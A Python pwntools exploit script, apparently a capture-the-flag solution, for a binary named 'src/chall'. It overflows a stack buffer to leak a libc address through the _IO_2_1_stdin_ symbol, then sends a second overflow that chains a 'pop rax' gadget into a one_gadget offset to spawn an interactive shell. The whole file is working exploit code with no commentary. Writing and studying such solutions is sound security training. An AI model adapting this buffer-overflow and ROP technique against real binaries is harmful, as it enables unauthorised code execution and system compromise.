#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
exe = 'src/chall'

if args.REMOTE:
    p = remote('localhost', 9999)   
else:
    p = process(exe)



l = context.binary = ELF(exe, checksec=False)
libc = ELF('libc.so.6')                  

gadget = lambda x: p64(next(libc.search(asm(x, os='linux', arch=libc.arch))))


p.sendlineafter(b'>>', b'krish')
p.sendlineafter(b'>>', b'0x80')

payload = b'A' * 0x50
payload += p64(0x404110)
payload += p64(l.symbols['main']+213)


p.sendline(payload)


p.recvuntil(b"Let's get started ")
libc.address = u64(p.recvuntil(b', ')[:-2].strip().ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdin_']


p.sendlineafter(b'>>', b'0x80')



payload = b'A' * 0x50
payload += p64(0x405000)
payload += gadget('pop rax; ret;')
payload += p64(0)
payload += p64(libc.address + 0xebd43)


p.sendline(payload)
p.interactive()